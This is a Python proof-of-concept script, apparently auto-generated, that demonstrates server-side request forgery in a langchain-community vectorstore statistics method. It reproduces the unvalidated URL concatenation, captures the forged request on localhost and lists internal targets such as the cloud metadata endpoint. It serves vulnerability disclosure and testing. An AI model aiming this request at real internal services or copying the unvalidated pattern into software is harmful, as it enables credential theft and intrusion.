#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: ssrf-005
# Sink: get_vectorstore_statistics
# Auto-generated — run with: python3 ssrf_sink_function_constructs_url_get_vectorstore_statistics.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF in langchain-community-only vectorstore statistics endpoint.

Vulnerability: The get_vectorstore_statistics method constructs a URL by
concatenating self.url with '/v1/statistics' and makes an HTTP POST request
using requests.post() without any validation or allowlist. If self.url is
attacker-controlled, this enables Server-Side Request Forgery (SSRF).

Impact: An attacker can force the application to make requests to internal
services (e.g., 127.0.0.1, 169.254.169.254) or attacker-controlled servers.
The response is returned to the caller, enabling reflective SSRF.

This PoC demonstrates the vulnerability by:
1. Starting a simple HTTP server to capture the request
2. Creating a mock vectorstore instance with an attacker-controlled URL
3. Triggering the vulnerable method to send a request to our server
"""

import json
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
import requests


class MockVectorStore:
    """
    Simulates the vulnerable langchain-community vectorstore class.
    The actual vulnerable code is in:
    /tmp/langchain-community-only/langchain_community/vectorstores/pathway.py
    """
    
    def __init__(self, url: str):
        """
        Initialize with a user-controlled URL (the vulnerability entry point).
        
        Args:
            url: Attacker-controlled base URL (no validation applied)
        """
        self.url = url
    
    def get_vectorstore_statistics(self):
        """
        VULNERABLE METHOD: Constructs URL by concatenation and makes request.
        This is the exact vulnerable code from the library.
        """
        # [SINK] URL constructed by simple concatenation - NO VALIDATION
        url = self.url + "/v1/statistics"
        
        # [SINK] HTTP POST request to attacker-controlled URL
        response = requests.post(
            url,
            json={},
            headers={"Content-Type": "application/json"},
            timeout=5  # Added timeout for safety
        )
        
        # Response returned to caller - enables reflective SSRF
        responses = response.json()
        return responses


class RequestCaptureHandler(BaseHTTPRequestHandler):
    """
    HTTP request handler that captures and displays incoming requests.
    Used to demonstrate that the SSRF request reaches our server.
    """
    
    captured_requests = []
    
    def do_POST(self):
        """Handle POST requests and capture their details."""
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length > 0 else b''
        
        request_info = {
            'path': self.path,
            'headers': dict(self.headers),
            'body': body.decode('utf-8') if body else ''
        }
        RequestCaptureHandler.captured_requests.append(request_info)
        
        # Send response back (simulating what a real service might return)
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        response_data = json.dumps({
            "status": "captured",
            "message": "SSRF request received successfully"
        }).encode('utf-8')
        self.wfile.write(response_data)
    
    def log_message(self, format, *args):
        """Suppress default logging for cleaner output."""
        pass


def start_capture_server(host='127.0.0.1', port=9999):
    """
    Start a simple HTTP server to capture SSRF requests.
    
    Args:
        host: Host to bind to
        port: Port to listen on
    
    Returns:
        Tuple of (server, thread)
    """
    server = HTTPServer((host, port), RequestCaptureHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] Capture server listening on http://{host}:{port}")
    return server, thread


def demonstrate_ssrf():
    """
    Demonstrate the SSRF vulnerability by:
    1. Starting a capture server
    2. Creating a mock vectorstore with attacker-controlled URL
    3. Triggering the vulnerable method
    4. Verifying the request was captured
    """
    
    # Configuration - change these to test different targets
    CAPTURE_HOST = '127.0.0.1'
    CAPTURE_PORT = 9999
    ATTACKER_URL = f'http://{CAPTURE_HOST}:{CAPTURE_PORT}'
    
    print("[*] LangChain Community SSRF Proof-of-Concept")
    print("[*] ==========================================")
    print()
    
    # Step 1: Start the capture server
    print(f"[*] Step 1: Starting capture server on {CAPTURE_HOST}:{CAPTURE_PORT}")
    server, server_thread = start_capture_server(CAPTURE_HOST, CAPTURE_PORT)
    time.sleep(0.5)  # Give server time to start
    
    try:
        # Step 2: Create mock vectorstore with attacker-controlled URL
        print(f"[*] Step 2: Creating mock vectorstore with URL: {ATTACKER_URL}")
        print(f"    (In a real attack, this would be an internal service URL)")
        print(f"    (e.g., http://169.254.169.254/latest/meta-data/)")
        vectorstore = MockVectorStore(ATTACKER_URL)
        
        # Step 3: Trigger the vulnerable method
        print(f"[*] Step 3: Calling get_vectorstore_statistics()...")
        print(f"    This will make a POST request to: {ATTACKER_URL}/v1/statistics")
        print()
        
        result = vectorstore.get_vectorstore_statistics()
        
        # Step 4: Verify the request was captured
        print(f"[*] Step 4: Checking captured requests...")
        if RequestCaptureHandler.captured_requests:
            captured = RequestCaptureHandler.captured_requests[0]
            print(f"    [+] SUCCESS: SSRF request captured!")
            print(f"    [+] Request path: {captured['path']}")
            print(f"    [+] Request headers: {json.dumps(captured['headers'], indent=6)}")
            print(f"    [+] Request body: {captured['body']}")
            print(f"    [+] Response from target: {json.dumps(result, indent=4)}")
        else:
            print(f"    [-] No requests were captured - vulnerability may not be triggered")
            
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
        print("    This is expected if the target server is not running.")
        print("    The vulnerability is still present - the code makes the request.")
    except requests.exceptions.Timeout:
        print("[-] Request timed out - target may be blocking or unreachable")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
    finally:
        # Cleanup
        print()
        print("[*] Cleanup: Shutting down capture server...")
        server.shutdown()
        print("[*] Done!")


def demonstrate_internal_service_scan():
    """
    Demonstrate how an attacker could probe internal services.
    This is a SAFE demonstration that only attempts to connect to
    localhost (127.0.0.1) which is the attacker's own machine.
    
    WARNING: Do not modify this to target actual internal services
    without proper authorization.
    """
    
    print()
    print("[*] Additional Demonstration: Internal Service Probing")
    print("[*] =================================================")
    print()
    print("[*] An attacker could change the URL to probe internal services:")
    print("    - http://127.0.0.1:8080 (local web server)")
    print("    - http://169.254.169.254/latest/meta-data/ (AWS metadata)")
    print("    - http://localhost:5432 (PostgreSQL)")
    print("    - http://internal.company.com (internal network)")
    print()
    print("[*] SAFE DEMO: Testing with localhost (127.0.0.1:9998)")
    print("    (This will likely fail - that's expected and safe)")
    
    # This demonstrates what an attacker would do - but with safe target
    try:
        safe_vectorstore = MockVectorStore("http://127.0.0.1:9998")
        result = safe_vectorstore.get_vectorstore_statistics()
        print(f"    Result: {result}")
    except requests.exceptions.ConnectionError:
        print("    [+] Connection refused (expected - no service on that port)")
        print("    [+] This confirms the code makes requests to arbitrary hosts")
    except Exception as e:
        print(f"    Error: {e}")


if __name__ == "__main__":
    print("=" * 60)
    print("LangChain Community SSRF Proof-of-Concept")
    print("=" * 60)
    print()
    print("[!] WARNING: This PoC is for educational/authorized testing only.")
    print("[!] Only use against systems you own or have permission to test.")
    print()
    
    demonstrate_ssrf()
    demonstrate_internal_service_scan()
    
    print()
    print("=" * 60)
    print("Vulnerability Confirmed: SSRF via get_vectorstore_statistics")
    print("=" * 60)
    print()
    print("Mitigation: Validate and allowlist the URL before making requests.")
    print("Never concatenate user input directly into request URLs.")
